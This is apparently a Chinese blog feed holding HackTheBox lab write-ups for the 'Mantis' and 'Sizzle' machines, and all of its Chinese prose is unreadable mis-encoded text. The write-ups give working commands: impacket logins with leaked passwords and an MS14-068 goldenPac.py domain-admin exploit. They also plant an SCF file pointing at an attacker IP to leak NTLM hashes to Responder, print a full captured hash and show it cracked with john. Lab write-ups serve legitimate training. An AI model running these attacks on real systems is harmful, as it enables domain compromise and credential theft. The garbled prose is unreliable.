alt="image-20240719105840793"></p><p>å‘ç°æœ‰ä¸ª<code>/secure_notes</code>ç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105933756-1435935472.png" alt="image-20240719105916031"></p><p>å‘ç°æœ‰ä¸¤ä¸ªæ–‡ä»¶</p><ul><li><code>web_config</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105955413-1263203338.png" alt="image-20240719105944860"></p><p>è¿™ä¸ªæ²¡ä»€ä¹ˆç”¨ï¼Œé‡ç‚¹çœ‹ç¬¬ä¸€ä¸ªæ–‡ä»¶</p><ul><li><code>dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110031571-1931928202.png" alt="image-20240719110021015"></p><p>çœ‹èµ·æ¥åƒæ˜¯å®‰è£…<code>cms</code>çš„æ“ä½œæ­¥éª¤ï¼Œå¦‚ä¸‹è½½ SQL server æ•°æ®åº“ã€åˆ›å»ºå¯¹åº”æ•°æ®åº“å’Œç®¡ç†å‘˜ç­‰</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110135329-2021603843.png" alt="image-20240719110124666"></p><p>åœ¨æœ€ä¸‹é¢æ‰¾åˆ°ä¸€ä¸²äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç–‘ä¼¼<code>admin</code>å¯†ç ï¼Œåˆ©ç”¨å·¥å…·å°è¯•è§£å¯†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110629100-105995333.png" alt="image-20240719110618385"></p><p>æ‹¿åˆ°å¯†ç <code>@dm!n_P@ssW0rd!</code></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨<code>shell</code>å‘½ä»¤è§£ç </p><p><code>echo &quot;010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001&quot; | perl -lpe &#39;$_=pack&quot;B*&quot;,$_&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719111202945-1455444381.png" alt="image-20240719111148937"></p><p>è¿™æ˜¯ä¼šå‘ç°æ–‡ä»¶ååƒæ˜¯æŸç§ç¼–ç ï¼Œä¹Ÿæ‹¿å·¥å…·å°è¯•ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110846704-1509776820.png" alt="image-20240719110835720"></p><p>æˆåŠŸæ‹¿åˆ°è²Œä¼¼æ˜¯æ•°æ®åº“çš„å¯†ç <code>m$$ql_S@_P@ssW0rd!</code></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨<code>shell</code>å‘½ä»¤è§£ç </p><p><code>echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719111302001-1732461918.png" alt="image-20240719111251279"></p><p>è¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†ä¸¤ä¸ªå¯†ç </p><h2 id="1433ç«¯å£"><a href="#1433ç«¯å£" class="headerlink" title="1433ç«¯å£"></a>1433ç«¯å£</h2><p>è¿™ä¸ªç«¯å£è¿è¡Œç€<code>SQL Server</code>æœåŠ¡ï¼Œä¸Šé¢å·²ç»æ‹¿åˆ°å¯†ç ï¼Œå°è¯•ç™»é™†</p><p>å…ˆå°è¯•ä½¿ç”¨é»˜è®¤æ•°æ®åº“ç®¡ç†å‘˜<code>sa</code>è¿›è¡Œç™»å½•æ•°æ®åº“</p><p><code>python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py &#39;sa:m$$ql_S@_P@ssW0rd!@10.10.10.52&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719112910589-1427023602.png" alt="image-20240719112859624"></p><p>ç™»é™†å¤±è´¥ï¼Œæ„Ÿè§‰æ˜¯ç”¨æˆ·åä¸å¯¹ï¼Œä½¿ç”¨ <code>OrchardCMS</code> çš„ç®¡ç†å‘˜ <code>admin</code> ä½œä¸ºç”¨æˆ·åç™»é™†</p><p><code>python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py &#39;admin:m$$ql_S@_P@ssW0rd!@10.10.10.52&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113048163-1389822070.png" alt="image-20240719113037299"></p><p>ç™»é™†æˆåŠŸï¼Œæ¥ä¸‹æ¥å¯¹æ•°æ®åº“è¿›è¡Œä¿¡æ¯æœé›†ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œä½¿ç”¨<code>GUI</code>å·¥å…·<code>DBeaver</code>è¿›è¡Œè¿æ¥</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113606800-1496602545.png" alt="image-20240719113555918"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113633820-92554602.png" alt="image-20240719113623175"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113856364-1854941201.png" alt="image-20240719113845434"></p><p>å¡«å¥½ç›¸å…³ä¿¡æ¯ï¼Œä¸‹è½½å¥½é©±åŠ¨å°±å¯ä»¥æµ‹è¯•è¿æ¥äº†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113934286-81611401.png" alt="image-20240719113923598"></p><p>è¿æ¥æˆåŠŸï¼æ¥ä¸‹æ¥å°±å¯ä»¥æŸ¥æ‰¾ç”¨æˆ·ä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719114616076-1096852668.png" alt="image-20240719114605389"></p><p>æœ€ç»ˆåœ¨<code>orcharddb</code>æ•°æ®åº“ä¸­çš„<code>blog_Orchard_Users_UserPartRecord</code>è¡¨ä¸­æ‰¾åˆ°ä¸€ä¸ª<code>James</code>ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç </p><p><code>james : J@m3s_P@ssW0rd!</code></p><h2 id="8080ç«¯å£"><a href="#8080ç«¯å£" class="headerlink" title="8080ç«¯å£"></a>8080ç«¯å£</h2><p>è¿™ä¸ªç«¯å£æœ‰<code>http</code>æœåŠ¡ï¼Œçœ‹æ ·å­æ˜¯ä¸ª<code>Blog</code>ï¼Œå…ˆç®€å•æŒ‡çº¹è¯†åˆ«ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718155206460-467081700.png" alt="image-20240718155158028"></p><p>å‘ç°<code>Orchard Core CMS</code></p><p>å°è¯•æœç´¢è¯¥CMSçš„å†å²æ¼æ´ï¼Œä½†æ˜¯è²Œä¼¼æ²¡æœ‰ä»€ä¹ˆèƒ½getshellçš„æ¼æ´</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719141417773-1235008164.png" alt="image-20240719141406528"></p><h1 id="James-æ¸—é€"><a href="#James-æ¸—é€" class="headerlink" title="James æ¸—é€"></a>James æ¸—é€</h1><p>æœ‰äº†ç”¨æˆ·<code>James</code>çš„å¯†ç <code>J@m3s_P@ssW0rd!</code>æ¥å¯ä»¥å†æ¬¡æµ‹è¯•ä¸€äº›æœåŠ¡</p><h2 id="SMB-1"><a href="#SMB-1" class="headerlink" title="SMB"></a>SMB</h2><p>åˆ©ç”¨<code>crackmapexec</code>å°è¯•ç™»å½•<code>SMB</code>æœåŠ¡</p><p><code>crackmapexec smb 10.10.10.52 -u james -p &#39;J@m3s_P@ssW0rd!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722093550555-1508748961.png" alt="image-20240722093527746"></p><p>å°è¯•åˆ©ç”¨<code>smbmap</code>è¿æ¥æŸ¥çœ‹<code>SMB</code>æœåŠ¡</p><p><code>smbmap -H 10.10.10.52 -u james -p &#39;J@m3s_P@ssW0rd!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094127633-77556185.png" alt="image-20240722094104907"></p><p>å‘ç°å½“å‰ç”¨æˆ·å¯¹ç›®å½•<code>SYSVOL</code>ã€<code>NETLOGON</code>æ‹¥æœ‰åªè¯»æƒé™</p><h2 id="rpc-1"><a href="#rpc-1" class="headerlink" title="rpc"></a>rpc</h2><p><code>rpcclient -U james 10.10.10.52 --password=&#39;J@m3s_P@ssW0rd!&#39;</code></p><p><code>enumdomusers</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094339148-278161430.png" alt="image-20240722094316905"></p><p>æ‰¾åˆ°ä»¥ä¸Šç”¨æˆ·ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆç”¨</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>å°è¯•è¿›è¡Œä¸€ä¸‹<code>Kerberoasting</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094800302-383462311.png" alt="image-20240722094731016"></p><p>ä»ç„¶æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯</p><h1 id="MS14-068æƒé™æå‡"><a href="#MS14-068æƒé™æå‡" class="headerlink" title="MS14-068æƒé™æå‡"></a>MS14-068æƒé™æå‡</h1><blockquote><p>ms14-068 æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯æ™®é€šç”¨æˆ·å‘ kerberos å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKDCï¼‰ç”³è¯·TGTï¼ˆç”±ç¥¨æ®æˆæƒæœåŠ¡äº§ç”Ÿçš„èº«ä»½å‡­è¯ï¼‰æ—¶ï¼Œå¯ä»¥ä¼ªé€ è‡ªå·±çš„ Kerberos ç¥¨æ®ã€‚å¦‚æœç¥¨æ®å£°æ˜è‡ªå·±æœ‰åŸŸç®¡ç†å‘˜æƒé™ï¼Œè€ŒKDCåœ¨å¤„ç†è¯¥ç¥¨æ®æ—¶æœªéªŒè¯ç¥¨æ®çš„ç­¾åï¼Œé‚£ä¹ˆè¿”å›ç»™ç”¨æˆ·çš„TGTå°±ä½¿æ™®é€šåŸŸç”¨æˆ·æ‹¥æœ‰äº†åŸŸç®¡ç†å‘˜æƒé™ã€‚è¯¥ç”¨æˆ·å¯ä»¥å°†TGTå‘é€ç»™KDCï¼ŒKDCçš„TGSï¼ˆç¥¨æ®æˆæƒæœåŠ¡ï¼‰åœ¨éªŒè¯äº†TGTåï¼Œå°†æœåŠ¡ç¥¨æ®ï¼ˆServer Ticketï¼‰å‘é€ç»™è¯¥ç”¨æˆ·ï¼Œè€Œè¯¥ç”¨æˆ·æ‹¥æœ‰è®¿é—®è¯¥æœåŠ¡çš„æƒé™ï¼Œä»è€Œä½¿æ”»å‡»è€…å¯ä»¥è®¿é—®åŸŸå†…çš„èµ„æºã€‚è€Œè¯¥æ¼æ´çš„åˆ©ç”¨æ¡ä»¶ä¹Ÿéå¸¸ç®€å•ï¼Œåªéœ€è¦æ‹¥æœ‰ä»»æ„åŸŸç”¨æˆ·çš„ç”¨æˆ·åã€SIDã€å¯†ç å³å¯è·å–åŸŸç®¡ç†å‘˜æƒé™ã€‚</p><p><a href="https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html">å‚è€ƒé“¾æ¥</a></p></blockquote><p>å…ˆä¿®æ”¹æœ¬åœ° hosts æ–‡ä»¶å®ŒæˆåŸŸåè§£æ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="comment"># é…ç½®</span></span><br><span class="line">10.10.10.52 mantis.htb.local mantis</span><br><span class="line">10.10.10.52 htb.local</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>impacket</code> å·¥å…·åŒ…ä¸­çš„<code>goldenPac.py</code>å¯è·å–ç›®æ ‡çš„ç³»ç»Ÿæƒé™</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105556807-977799087.png" alt="image-20240722105534389"></p><p>æˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105706614-1389153774.png" alt="image-20240722105644503"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105833170-745399915.png" alt="image-20240722105809518"></p><p>æœ€åä¹Ÿæ˜¯åœ¨<code>james</code>å’Œ<code>Administrator</code>çš„<code>Desktop</code>æ‰¾åˆ°<code>user.txt</code>å’Œ<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Mantis</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Sizzle</title>
    <link href="https://www.fomal.cc/posts/33c7d1f3.html"/>
    <id>https://www.fomal.cc/posts/33c7d1f3.html</id>
    <published>2024-07-15T09:19:03.000Z</published>
    <updated>2024-10-06T08:25:15.681Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.103</p><p>æ”»å‡»æœºipï¼š10.10.14.28</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>SCFæ–‡ä»¶æ”»å‡»</li><li>Net-NTLMv2 hashç ´è§£</li><li>åˆ©ç”¨è¯ä¹¦ç™»å½•evil-winrm</li><li>BypassCLM</li><li>Kerberoasting</li><li>Bypass-AppLocker</li><li>DCSyncæ”»å‡»</li><li>PTHä¼ é€’æ”»å‡»</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC 10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714192941833-311799853.png" alt="image-20240714192938885"></p><p>å‘ç°æœ‰<code>ftp</code>æœåŠ¡ã€<code>DNS</code>æœåŠ¡ã€<code>Web</code>æœåŠ¡ã€<code>ldap</code>æœåŠ¡ã€ <code>smb</code>æœåŠ¡ï¼ŒåŸŸåä¸º<code>HTB.LOCAL</code></p><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>æ‰«æçš„ç»“æœæ˜¾ç¤º<code>ftp</code>å¯ä»¥ç™»å½•ï¼Œä½¿ç”¨<code>ftp</code>å°è¯•ç™»å½•</p><p><code>ftp 10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715095535177-874727963.png" alt="image-20240715095535121"></p><p>æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>å‘ç°å¼€æ”¾<code>80</code>å’Œ<code>443</code>ä¸¤ä¸ªç«¯å£ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102127906-768479907.png" alt="image-20240715102126567"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102138843-732144389.png" alt="image-20240715102138611"></p><p>å‘ç°ä¸¤ä¸ªç½‘ç«™å¯èƒ½æ˜¯åŒä¸€ä¸ª</p><p>æ‹¿<code>dirsearch</code>æ‰«ä¸€ä¸‹ç½‘ç«™ç›®å½•</p><p><code>dirsearch -u http://10.10.10.103/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102637131-207095840.png" alt="image-20240715102636442"></p><p>å¾ˆæ˜æ˜¾æœ‰ä¸ªä¸ä¼—ä¸åŒçš„ç»“æœè®¿é—®ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102216653-962407690.png" alt="image-20240715102213171"></p><p>å‘ç°å­˜åœ¨ä¸€ä¸ªç™»å½•æ¡†ï¼Œä½†æ˜¯æ²¡æœ‰ç”¨æˆ·åå’Œå¯†ç ï¼Œå…ˆæ”¾ç€</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p><code>ldapsearch -x -H ldap://10.10.10.103:389 -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715100348580-149165439.png" alt="image-20240715100348090"></p><p>æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -N -L \\10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715100733593-1338901198.png" alt="image-20240715100732440"></p><p>å‘ç°å¦‚ä¸Šä¿¡æ¯ï¼Œæµ‹è¯•ä¸€ä¸‹</p><p><code>smbclient -U &quot;&quot; //10.10.10.103/CertEnroll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715101406558-1730694173.png" alt="image-20240715101406187"></p><p>å‘ç°è¿æ¥åˆ°<code>CertEnroll</code>ï¼Œä½†æ˜¯æ²¡æœ‰å¯æ‰§è¡Œå‘½ä»¤çš„æƒé™ï¼Œä½†æ˜¯è¿™ä¸ªå¾ˆå¥‡æ€ªï¼Œæ„Ÿè§‰è·Ÿä¹‹å‰æµ‹è¯•çš„<code>web</code>çš„ç™»é™†æœ‰å…³ç³»ï¼Œä½†æ˜¯æ²¡æœ‰è¯»å–æƒé™ï¼Œç»§ç»­æµ‹è¯•</p><p> <code>smbclient -U &quot;&quot; //10.10.10.103/&quot;Department Shares&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102824347-2140539819.png" alt="image-20240715102824177"></p><p>å‘ç°åœ¨<code>Department Shares</code>é‡Œï¼Œå¯ä»¥ç»§ç»­æ“ä½œï¼Œå…ˆæ¥ç€æµ‹è¯•</p><p><code>smbclient -U &quot;&quot; //10.10.10.103/NETLOGON</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102714604-398683803.png" alt="image-20240715102714094"></p><p>è¿˜æ˜¯æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œç»§ç»­æµ‹è¯•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715103850485-1432636840.png" alt="image-20240715103849910"></p><p>å‘ç°é™¤äº†<code>Department Shares</code>å…¶ä»–éƒ½ä¸å¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥é‡ç‚¹æ”¾åœ¨<code>Department Shares</code>ä¸Š</p><p>æˆ‘ä»¬æ³¨æ„åˆ°<code>dir</code>ç»“æœä¸­æœ‰<code>Users</code>ç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715104251701-1224385604.png" alt="image-20240715104251552"></p><p>æ‹¿åˆ°ç”¨æˆ·ååˆ—è¡¨ï¼Œä½†æ˜¯ç›®å½•éƒ½æ˜¯ç©ºçš„</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">amanda</span><br><span class="line">amanda_adm</span><br><span class="line">bill</span><br><span class="line">bobcd Users</span><br><span class="line">chris</span><br><span class="line">henry</span><br><span class="line">joe</span><br><span class="line">jose</span><br><span class="line">lkys37en</span><br><span class="line">morgan</span><br><span class="line">mrb3n</span><br><span class="line">Public</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿åç»­æ“ä½œä»¥åŠä¾¿äºæŸ¥æ‰¾ç›¸å…³æ–‡ä»¶ï¼Œå°†<code>Department Shares</code>æŒ‚è½½åˆ°æœ¬åœ°</p><p><code>mount -t cifs &quot;//10.10.10.103/Department Shares&quot; /root/htb/Machines/Sizzle/file</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715110927818-212747079.png" alt="image-20240715110927331"></p><p>æ–‡ä»¶æœ‰ç‚¹å¤šï¼Œå†™<code>bash</code>è„šæœ¬æ£€æŸ¥è¯¥å…±äº«åä¸‹å„ä¸ªç›®å½•çš„å†™å…¥æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> d | <span class="keyword">while</span> <span class="built_in">read</span> directory; <span class="keyword">do</span> </span><br><span class="line">    <span class="built_in">touch</span> <span class="variable">$&#123;directory&#125;</span>/a 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;directory&#125;</span> - write file&quot;</span> &amp;&amp; <span class="built_in">rm</span> <span class="variable">$&#123;directory&#125;</span>/a; </span><br><span class="line">    <span class="built_in">mkdir</span> <span class="variable">$&#123;directory&#125;</span>/a 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;directory&#125;</span> - write dir&quot;</span> &amp;&amp; <span class="built_in">rmdir</span> <span class="variable">$&#123;directory&#125;</span>/a; </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715112556282-78033102.png" alt="image-20240715112555698"></p><p>ç»“æœæ˜¾ç¤º<code>/Users/Public</code>ã€<code>/ZZ_ARCHIVE</code>ç›®å½•æ‹¥æœ‰å†™å…¥æƒé™</p><h1 id="è·å–ç”¨æˆ·åå¯†ç "><a href="#è·å–ç”¨æˆ·åå¯†ç " class="headerlink" title="è·å–ç”¨æˆ·åå¯†ç "></a>è·å–ç”¨æˆ·åå¯†ç </h1><h2 id="SCFæ–‡ä»¶æ”»å‡»"><a href="#SCFæ–‡ä»¶æ”»å‡»" class="headerlink" title="SCFæ–‡ä»¶æ”»å‡»"></a>SCFæ–‡ä»¶æ”»å‡»</h2><blockquote><p>SCFï¼ˆShell å‘½ä»¤æ–‡ä»¶ï¼‰æ–‡ä»¶å¯ç”¨äºæ‰§è¡Œä¸€ç»„æœ‰é™çš„æ“ä½œï¼Œä¾‹å¦‚æ˜¾ç¤º Windows æ¡Œé¢æˆ–æ‰“å¼€ Windows èµ„æºç®¡ç†å™¨ï¼Œç„¶è€Œï¼ŒSCF æ–‡ä»¶å¯ç”¨äºè®¿é—®æ¸—é€æµ‹è¯•äººå‘˜æ„å»ºç‰¹å®š UNC è·¯å¾„ç”¨äºæ”»å‡»ã€‚å°†æ¶æ„ä»£ç å¯ä»¥æ”¾åœ¨ä¸€ä¸ªSCFæ–‡ä»¶ä¸­ï¼Œç„¶åå°†å…¶æ¤å…¥ç½‘ç»œå…±äº«ä¸­ã€‚è¯¥æ–‡ä»¶åœ¨ç”¨æˆ·æµè§ˆæ–‡ä»¶æ‰€åœ¨ç›®å½•æ—¶è¢«æ‰§è¡Œï¼Œç³»ç»Ÿå°†é€šè¿‡smbåè®®å‘æ¸—é€æµ‹è¯•äººå‘˜æ„å»ºçš„ç‰¹å®š UNC è·¯å¾„å‘èµ·Net-NTLMèº«ä»½éªŒè¯è¯·æ±‚ï¼Œæ­¤æ—¶çš„è¯·æ±‚ä¸­åŒ…å«è¯¥ç”¨æˆ·çš„Net-NTLM hashï¼Œæ”»å‡»è€…ä½¿ç”¨responderå³å¯æ•è·è¯¥ç”¨æˆ·çš„Net-NTLM  hashã€‚</p><p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SCFæ–‡ä»¶æ”»å‡»</a></p><p><a href="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html">Net-NTLM hashåˆ©ç”¨</a></p></blockquote><p>äº†è§£å®Œæ”»å‡»åŸç†ï¼Œä¸‹é¢å°±å¼€å§‹æ“ä½œ</p><p>å…ˆå‡†å¤‡ä¸€ä»½<code>.scf</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.28\icon</span><br></pre></td></tr></table></figure><p>å°†å…¶ä¿å­˜ä¸º<code>evil.scf</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715133205878-926345847.png" alt="image-20240715133205426"></p><p>å°†è¿™ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°<code>/Users/Public</code>å’Œ<code>/ZZ_ARCHIVE</code>ä¸‹</p><p><code>cp ./evil.scf ./file/Users/Public/</code></p><p><code>cp ./evil.scf ./file/ZZ_ARCHIVE/</code></p><p>è¿™æ—¶å‘ç°é•¿æ—¶é—´åï¼Œè¯¥æ–‡ä»¶ä¼šè‡ªåŠ¨åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨æœ‰é™çš„æ—¶é—´å†…å®Œæˆè¯¥æ“ä½œ</p><p>åˆ©ç”¨<code>kali</code>ä¸­çš„<code>responder</code>å·¥å…·ç›‘å¬<code>tun0</code>ç½‘å¡</p><p><code>responder -v -I tun0</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145001346-1000664214.png" alt="image-20240715145000909"></p><p>åœ¨<code>/Users/Public</code>æˆ–<code>/ZZ_ARCHIVE</code>ç›®å½•ä¸‹æ‰§è¡Œä¸€ä¸‹å‘½ä»¤æ¥ç¡®ä¿å¯¹å…±äº«ç›®å½•è¿›è¡Œæ“ä½œï¼Œå¦‚æ˜¾ç¤ºç›®å½•æ–‡ä»¶ç­‰æ“ä½œåæ‰ä¼šè§¦å‘è¿™ä¸ª<code>evil.scf</code></p><p>è¿™é‡Œåœ¨<code>/Users/Public</code>ä¸‹æ‰§è¡Œ<code>ls</code>å‘½ä»¤</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715143451775-597887204.png" alt="image-20240715143448053"></p><p>ç­‰å¾…ä¸€æ®µæ—¶é—´å³å¯æ”¶åˆ°<code>hash</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715144941717-2133617100.png" alt="image-20240715144941244"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amanda::HTB:6c1c482b8fd38bc2:74353BFE9ED1551710F2EAB77E964736:0101000000000000809FE0F9C5D6DA010886DA0021AC198B00000000020008004500540050005A0001001E00570049004E002D0044004700490049005700480030004C0035003000520004003400570049004E002D0044004700490049005700480030004C003500300052002E004500540050005A002E004C004F00430041004C00030014004500540050005A002E004C004F00430041004C00050014004500540050005A002E004C004F00430041004C0007000800809FE0F9C5D6DA0106000400020000000800300030000000000000000100000000200000C8847E6DA30D41FBC1F90E41FE1606FCD8CE7DDD4B7D1EB79979B1345E0EAD9C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003800000000000000000000000000</span><br></pre></td></tr></table></figure><h2 id="Net-NTLMv2-hashç ´è§£"><a href="#Net-NTLMv2-hashç ´è§£" class="headerlink" title="Net-NTLMv2 hashç ´è§£"></a>Net-NTLMv2 hashç ´è§£</h2><p>å°†ä¸Šè¿°<code>hash</code>å€¼ä¿å­˜åˆ°æ–‡ä»¶<code>hash</code>ä¸­ï¼Œä½¿ç”¨<code>john</code>çˆ†ç ´</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145240039-45553713.png" alt="image-20240715145239638"></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145344115-203461178.png" alt="image-20240715145343859"></p><p>è‡³æ­¤æ‹¿åˆ°ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼š<code>amanda : Ashare1972</code></p><p>å…ˆåˆ©ç”¨<code>crackmapexec</code>éªŒè¯ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145725094-1900698795.png" alt="image-20240715145724720"></p><p>å°è¯•ä½¿ç”¨<code>evil-winrm</code>ç™»é™†å¤±è´¥</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715150558411-1621839895.png" 